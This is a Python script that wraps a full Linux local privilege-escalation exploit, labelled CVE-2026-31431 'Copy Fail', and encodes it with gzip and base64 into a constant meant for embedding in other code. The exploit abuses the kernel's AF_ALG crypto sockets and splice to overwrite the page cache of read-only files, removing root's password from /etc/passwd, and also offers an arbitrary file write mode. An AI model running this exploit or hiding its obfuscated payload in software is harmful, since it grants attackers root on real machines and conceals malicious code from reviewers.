"""Generate gzip+base64 obfuscated exploit payload for embedding."""
import gzip
import base64

EXPLOIT_SRC = r'''#!/usr/bin/env python3
import os
import socket
import sys
import ctypes
import ctypes.util

if not hasattr(os, "splice"):
    _libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)
    _libc.splice.argtypes = [
        ctypes.c_int,
        ctypes.POINTER(ctypes.c_int64),
        ctypes.c_int,
        ctypes.POINTER(ctypes.c_int64),
        ctypes.c_size_t,
        ctypes.c_uint,
    ]
    _libc.splice.restype = ctypes.c_ssize_t

    def _splice(fd_in, fd_out, count, offset_src=None, offset_dst=None):
        if offset_src is not None:
            off_in = ctypes.byref(ctypes.c_int64(offset_src))
        else:
            off_in = None
        if offset_dst is not None:
            off_out = ctypes.byref(ctypes.c_int64(offset_dst))
        else:
            off_out = None
        ret = _libc.splice(fd_in, off_in, fd_out, off_out, count, 0)
        if ret < 0:
            err = ctypes.get_errno()
            raise OSError(err, os.strerror(err))
        return ret
    os.splice = _splice

AF_ALG = 38
SOCK_SEQPACKET = 5
SOL_ALG = 279
MSG_MORE = 0x8000
ALG_SET_KEY = 1
ALG_SET_IV = 2
ALG_SET_OP = 3
ALG_SET_AEAD_ASSOCLEN = 4
ALG_SET_AEAD_AUTHSIZE = 5
AEAD_ALGORITHM = "authencesn(hmac(sha256),cbc(aes))"
AUTH_TAG_SIZE = 4
ASSOC_LEN = 8
IV_LEN = 16

AUTHENC_KEY = (
    b"\x08\x00\x01\x00\x00\x00\x00\x10"
    + b"\x00" * 32
)

def _build_cmsg():
    return [
        (SOL_ALG, ALG_SET_OP, (0).to_bytes(4, "little")),
        (SOL_ALG, ALG_SET_IV, IV_LEN.to_bytes(4, "little") + b"\x00" * IV_LEN),
        (SOL_ALG, ALG_SET_AEAD_ASSOCLEN, ASSOC_LEN.to_bytes(4, "little")),
    ]

CMSG = _build_cmsg()

def _write_4bytes(target_fd, file_offset, value):
    assert len(value) == 4
    alg = socket.socket(AF_ALG, SOCK_SEQPACKET, 0)
    alg.bind(("aead", AEAD_ALGORITHM))
    alg.setsockopt(SOL_ALG, ALG_SET_KEY, AUTHENC_KEY)
    alg.setsockopt(SOL_ALG, ALG_SET_AEAD_AUTHSIZE, None, AUTH_TAG_SIZE)
    req, _ = alg.accept()
    aad = b"\x41" * 4 + value
    req.sendmsg([aad], CMSG, MSG_MORE)
    splice_len = file_offset + AUTH_TAG_SIZE
    pipe_r, pipe_w = os.pipe()
    os.splice(target_fd, pipe_w, splice_len, offset_src=0)
    os.splice(pipe_r, req.fileno(), splice_len)
    os.close(pipe_r)
    os.close(pipe_w)
    try:
        req.recv(ASSOC_LEN + file_offset)
    except OSError:
        pass
    req.close()
    alg.close()


class PageCacheWriter:
    def __init__(self, path):
        self.path = path
        self._fd = None

    def __enter__(self):
        self._fd = os.open(self.path, os.O_RDONLY)
        self._file_size = os.fstat(self._fd).st_size
        return self

    def __exit__(self, *_):
        if self._fd is not None:
            os.close(self._fd)
            self._fd = None

    def write(self, offset, data):
        if self._fd is None:
            raise RuntimeError("Writer not open. Use 'with' statement.")
        end = offset + len(data)
        if end + AUTH_TAG_SIZE > self._file_size:
            raise ValueError(
                f"Write at [{offset}:{end}] requires file size >= {end + AUTH_TAG_SIZE}, "
                f"but {self.path} is {self._file_size} bytes."
            )
        if offset < 0:
            raise ValueError("Offset must be non-negative.")
        bytes_written = 0
        pos = 0
        while pos < len(data):
            chunk = data[pos:pos + 4]
            if len(chunk) < 4:
                chunk = chunk.ljust(4, b"\x90")
            _write_4bytes(self._fd, offset + pos, chunk)
            bytes_written += min(4, len(data) - pos)
            pos += 4
        return bytes_written

    def read_cached(self, offset, length):
        os.lseek(self._fd, offset, os.SEEK_SET)
        return os.read(self._fd, length)


def passwd_escalate():
    with open("/etc/passwd", "rb") as f:
        content = f.read()
    with open("/tmp/.passwd.bak", "wb") as f:
        f.write(content)
    for line in content.split(b"\n"):
        if line.startswith(b"root:"):
            break
    else:
        return False
    line_offset = content.index(line)
    fields = list(line.split(b":"))
    if fields[1] == b"":
        return True
    old_pw = fields[1]
    fields[1] = b""
    fields[4] = fields[4] + b" " * len(old_pw)
    new_line = b":".join(fields)
    assert len(new_line) == len(line), f"Length mismatch: {len(new_line)} vs {len(line)}"
    with PageCacheWriter("/etc/passwd") as w:
        pos = 0
        while pos < len(new_line):
            chunk = new_line[pos:pos + 4]
            if len(chunk) < 4:
                tail_off = line_offset + pos + len(chunk)
                chunk = chunk + content[tail_off:tail_off + (4 - len(chunk))]
            file_off = line_offset + pos
            _write_4bytes(w._fd, file_off, chunk)
            pos += 4
    with open("/etc/passwd", "rb") as f:
        verify = f.read()
    patched = verify[line_offset:line_offset + len(line)]
    return patched.startswith(b"root::0:0:")


def main():
    if len(sys.argv) < 2:
        print("Usage:")
        print(f"  {sys.argv[0]} escalate             - patch /etc/passwd, passwordless su root")
        print(f"  {sys.argv[0]} write <file> <off> <d> - arbitrary page-cache write")
        sys.exit(1)
    cmd = sys.argv[1]
    if cmd == "escalate":
        print("[*] CVE-2026-31431 - Copy Fail")
        print("[*] Mode: remove root password via /etc/passwd")
        ok = passwd_escalate()
        if ok:
            print("[+] Page cache patched: root password removed")
            print("[*] Run 'su root' (no password needed)")
        else:
            print("[-] Escalation failed")
            sys.exit(1)
    elif cmd == "write":
        if len(sys.argv) < 5:
            print("Usage: write <file> <offset> <data>")
            sys.exit(1)
        target_path = sys.argv[2]
        offset = int(sys.argv[3], 0)
        data_arg = sys.argv[4]
        if data_arg.startswith("@"):
            with open(data_arg[1:], "rb") as f:
                data = f.read()
        else:
            data = data_arg.encode("utf-8").decode("unicode_escape").encode("latin-1")
        with PageCacheWriter(target_path) as w:
            w.write(offset, data)
        print(f"[+] {len(data)} bytes written to page cache of {target_path}")
    else:
        print(f"Unknown command: {cmd}")
        sys.exit(1)

if __name__ == "__main__":
    main()
'''

def encode_payload(source: str) -> str:
    compressed = gzip.compress(source.encode("utf-8"))
    return base64.b64encode(compressed).decode("ascii")

encoded = encode_payload(EXPLOIT_SRC)
print(f"Payload encoded: {len(encoded)} chars")
print(f"Original: {len(EXPLOIT_SRC)} bytes")
print(f"Compressed: {len(base64.b64decode(encoded))} bytes")
print()

# Verify roundtrip
decoded = base64.b64decode(encoded)
decompressed = gzip.decompress(decoded).decode("utf-8")
assert decompressed == EXPLOIT_SRC, "Roundtrip failed!"
print("Roundtrip verification: OK")
print()

# Output the Python constant block
print("# --- Generated payload constant ---")
print(f'EXPLOIT_PAYLOAD_B64 = (')
for i in range(0, len(encoded), 80):
    chunk = encoded[i:i+80]
    print(f'    "{chunk}"')
print(')')
print(f'\nEXPLOIT_PAYLOAD_SIZE = {len(EXPLOIT_SRC)}')
import hashlib
print(f'EXPLOIT_PAYLOAD_SHA256 = "{hashlib.sha256(EXPLOIT_SRC.encode()).hexdigest()}"')
